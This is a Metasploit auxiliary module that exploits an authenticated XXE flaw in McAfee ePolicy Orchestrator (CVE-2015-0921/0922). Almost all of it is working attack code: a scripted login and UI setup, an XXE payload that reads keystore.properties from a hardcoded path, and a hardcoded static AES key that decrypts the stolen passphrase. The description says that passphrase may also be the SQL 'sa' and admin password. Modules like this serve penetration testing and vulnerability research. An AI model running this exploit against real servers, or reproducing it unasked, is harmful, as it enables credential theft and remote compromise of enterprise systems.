##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'openssl'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'McAfee ePolicy Orchestrator Authenticated XXE Credentials Exposure',
      'Description'    => %q{
      This module will exploit an authenticated XXE vulnerability to read the keystore.properties
      off of the filesystem. This properties file contains an encrypted password that is set during
      installation. What is interesting about this password is that it is set as the same password
      as the database 'sa' user and of the admin user created during installation. This password
      is encrypted with a static key, and is encrypted using a weak cipher (ECB). By default,
      if installed with a local SQL Server instance, the SQL Server is listening on all interfaces.

      Recovering this password allows an attacker to potentially authenticate as the 'sa' SQL Server
      user in order to achieve remote command execution with permissions of the database process. If
      the administrator has not changed the password for the initially created account since installation,
      the attacker will have the password for this account. By default, 'admin' is recommended.

      Any user account can be used to exploit this, all that is needed is a valid credential.

      The most data that can be successfully retrieved is 255 characters due to length restrictions
      on the field used to perform the XXE attack.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Brandon Perry <bperry.volatile[at]gmail.com>' #metasploit module
        ],
      'References'     =>
        [
          ['CVE', '2015-0921'],
          ['CVE', '2015-0922'],
          ['URL', 'https://seclists.org/fulldisclosure/2015/Jan/8']
        ],
      'DisclosureDate' => 'Jan 6 2015'
    ))

    register_options(
      [
        Opt::RPORT(8443),
        OptBool.new('SSL', [true, 'Use SSL', true]),
        OptString.new('TARGETURI', [ true, "Base ePO directory path", '/']),
        OptString.new('USERNAME', [true, "The username to authenticate with", "username"]),
        OptString.new('PASSWORD', [true, "The password to authenticate with", "password"])
      ])
  end

  def run
    key = "\x5E\x9C\x3E\xDF\xE6\x25\x84\x36\x66\x21\x93\x80\x31\x5A\x29\x33" #static key used

    aes = OpenSSL::Cipher.new('AES-128-ECB') # ecb, bad bad tsk
    aes.decrypt
    aes.padding=1
    aes.key = key

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'core', 'orionSplashScreen.do')
    })

    unless res
      fail_with(Failure::Unknown, "Server did not respond in an expected way")
    end

    cookie = res.get_cookies

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'core', 'j_security_check'),
      'method' => 'POST',
      'vars_post' => {
        'j_username' => datastore['USERNAME'],
        'j_password' => datastore['PASSWORD']
      },
      'cookie' => cookie
    })

    unless res
      fail_with(Failure::Unknown, "Server did not respond in an expected way")
    end

    cookie = res.get_cookies

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'core', 'orionSplashScreen.do'),
      'cookie' => cookie
    })

    unless res
      fail_with(Failure::Unknown, "Server did not respond in an expected way")
    end

    if res.code != 302
      fail_with(Failure::Unknown, 'Authentication failed')
    end

    cookie = res.get_cookies

    #This vuln requires a bit of setup before we can exploit it

    print_status("Setting up environment for exploitation")

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'core', 'orionNavigationLogin.do'),
      'cookie' => cookie
    })

    unless res
      fail_with(Failure::Unknown, "Server did not respond in an expected way")
    end

    auth_token = $1 if res.body =~ /id="orion.user.security.token" value="(.*)"\/>/

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'core', 'orionTab.do'),
      'vars_get' => {
        'sectionId' => 'orion.automation',
        'tabId' => 'orion.tasklog',
        'orion.user.security.token' => auth_token
      },
      'cookie' => cookie
    })

    unless res
      fail_with(Failure::Unknown, "Server did not respond in an expected way")
    end

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'core', 'loadTableData.do'),
      'vars_get' => {
        'datasourceAttr' => 'scheduler.tasklog.datasource.attr',
        'filter' => 'scheduler.tasklog.filter.day',
        'secondaryFilter' => '',
        'tableCellRendererAttr' => 'taskLogCellRenderer',
        'count' => 44,
        'sortProperty' => 'OrionTaskLogTask.StartDate',
        'sortOrder' => 1,
        'id' => 'taskLogTable'
      },
      'cookie' => cookie
    })

    unless res
      fail_with(Failure::Unknown, "Server did not respond in an expected way")
    end

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'core', 'orionEditTableFilter.do'),
      'vars_get' => {
        'datasourceAttr' => 'scheduler.tasklog.datasource.attr',
        'tableId' => 'taskLogTable',
        'orion.user.security.token' => auth_token
      },
      'cookie' => cookie
    })

    unless res
      fail_with(Failure::Unknown, "Server did not respond in an expected way")
    end

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'core', 'orionTableUpdateState.do'),
      'method' => 'POST',
      'vars_post' => {
        'dataSourceAttr' => 'scheduler.tasklog.datasource.attr',
        'tableId' => 'taskLogTable',
        'columnWidths' => '285,285,285,285,285,285,285,285',
        'sortColumn' => 'OrionTaskLogTask.StartDate',
        'sortOrder' => '1',
        'showFilters' => 'true',
        'currentIndex' => 0,
        'orion.user.security.token' => auth_token,
        'ajaxMode' => 'standard'
      },
      'cookie' => cookie
    })

    unless res
      fail_with(Failure::Unknown, "Server did not respond in an expected way")
    end

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'core', 'loadDisplayType.do'),
      'method' => 'POST',
      'vars_post' => {
        'displayType' => 'text_lookup',
        'operator' => 'eq',
        'propKey' => 'OrionTaskLogTask.Name',
        'instanceId' => 0,
        'orion.user.security.token' => auth_token,
        'ajaxMode' => 'standard'
      },
      'cookie' => cookie
    })

    print_status("Sending payload...")

    filepath = "C:/Program Files (x86)/McAfee/ePolicy Orchestrator/Server/conf/orion/keystore.properties"
    xxe = '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///'+filepath+'" >]><conditions><condition grouping="or"><prop-key>OrionTaskLogTaskMessage.Message</prop-key><op-key>eq</op-key><value>&xxe;</value></condition></conditions>'

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'core', 'orionUpdateTableFilter.do'),
      'method' => 'POST',
      'vars_post' => {
        'orion.user.security.token' => auth_token,
        'datasourceAttr' => 'scheduler.tasklog.datasource.attr',
        'tableId' => 'taskLogTable',
        'conditionXML' => xxe,
        'secondaryFilter' => '',
        'op' => 'eq',
        'ajaxMode' => 'standard'
      },
      'cookie' => cookie
    })

    unless res
      fail_with(Failure::Unknown, "Server did not respond in an expected way")
    end

    if res.code == 404
      fail_with(Failure::Unknown, "Server likely has mitigation in place")
    end

    print_status("Getting encrypted passphrase value from keystore.properties file...")

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'core', 'orionEditTableFilter.do'),
      'vars_get' => {
        'datasourceAttr' => 'scheduler.tasklog.datasource.attr',
        'tableId' => 'taskLogTable',
        'orion.user.security.token' => auth_token
      },
      'cookie' => cookie
    })

    unless res
      fail_with(Failure::Unknown, "Server did not respond in an expected way")
    end

    passphrase = $1 if res.body =~ /passphrase=(.*?)\\u003/

    passphrase = passphrase.gsub('\\\\=', '=').gsub("\\u002f", "/").gsub("\\u002b", "+")

    print_status("Base64 encoded encrypted passphrase: #{passphrase}")

    passphrase = aes.update(Rex::Text.decode_base64(passphrase)) + aes.final

    print_good("The decrypted password for the keystore, 'sa' SQL user (if using local instance), and possibly 'admin' is: #{passphrase}")
  end
end
